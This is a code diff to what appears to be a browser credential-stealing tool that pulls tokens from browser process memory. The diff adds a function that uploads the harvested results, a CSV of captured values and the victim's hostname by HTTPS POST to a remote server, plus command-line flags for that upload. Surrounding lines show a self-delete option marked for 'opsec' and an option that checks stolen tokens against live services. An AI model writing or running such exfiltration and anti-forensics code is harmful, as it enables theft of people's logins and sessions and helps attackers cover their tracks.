@@ -1675,6 +1675,52 @@ def process_browser(name: str, process_name: str, user_data_path: str,
     return lines, csv_rows
 
 
+# ── Exfil ─────────────────────────────────────────────────────────────────────
+def _exfil_results(url: str, api_key: str, txt_path: str, csv_path: str | None) -> str:
+    import http.client
+    import ssl
+    import platform
+    import urllib.parse
+    import json as _json
+
+    boundary = b"BrowserBleedBoundary7MA4YWxkTrZu0gW"
+
+    def _field(name: str, value: str) -> bytes:
+        return (b"--" + boundary + b"\r\n"
+                b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n\r\n'
+                + value.encode() + b"\r\n")
+
+    def _file_field(name: str, filename: str, data: bytes) -> bytes:
+        return (b"--" + boundary + b"\r\n"
+                b'Content-Disposition: form-data; name="' + name.encode()
+                + b'"; filename="' + filename.encode() + b'"\r\n'
+                b"Content-Type: application/octet-stream\r\n\r\n"
+                + data + b"\r\n")
+
+    try:
+        body = _field("hostname", platform.node())
+        with open(txt_path, "rb") as f:
+            body += _file_field("txt", "results.txt", f.read())
+        if csv_path and os.path.exists(csv_path):
+            with open(csv_path, "rb") as f:
+                body += _file_field("csv", "results.csv", f.read())
+        body += b"--" + boundary + b"--\r\n"
+
+        parsed = urllib.parse.urlparse(url.rstrip("/"))
+        ctx = ssl.create_default_context()
+        conn = http.client.HTTPSConnection(parsed.netloc, context=ctx, timeout=30)
+        conn.request("POST", "/upload", body=body, headers={
+            "Authorization": f"Bearer {api_key}",
+            "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
+        })
+        resp = conn.getresponse()
+        data = _json.loads(resp.read())
+        conn.close()
+        return data.get("url", "")
+    except Exception:
+        return ""
+
+
 # ── Main ───────────────────────────────────────────────────────────────────────
 def main():
     global _do_oidc
@@ -1689,6 +1735,8 @@ def main():
     parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser before dedup (default: 300)")
     parser.add_argument("--self-delete", action="store_true", help="Delete exe after run (opsec)")
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (makes outbound requests)")
+    parser.add_argument("--exfil",       metavar="URL",       help="POST results to report server (e.g. https://reports.yourdomain.com)")
+    parser.add_argument("--exfil-key",   metavar="KEY",       help="API key for --exfil upload")
     args = parser.parse_args()
 
     if args.verify:
@@ -1783,6 +1831,14 @@ def main():
             writer = _csv.DictWriter(f, fieldnames=["browser", "profile", "label", "service", "value", "address"])
             writer.writeheader()
             writer.writerows(all_csv_rows)
+
+    if args.exfil:
+        if args.exfil_key:
+            csv_path_for_exfil = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
+            report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path_for_exfil if all_csv_rows else None)
+            if report_url:
+                with open(out_path, "a", encoding="utf-8") as f:
+                    f.write(f"\n[+] Exfil: {report_url}\n")
 
     if args.self_delete and getattr(sys, "frozen", False):
         os.popen(f'cmd /c ping -n 2 127.0.0.1 > nul & del /f /q "{sys.executable}"')
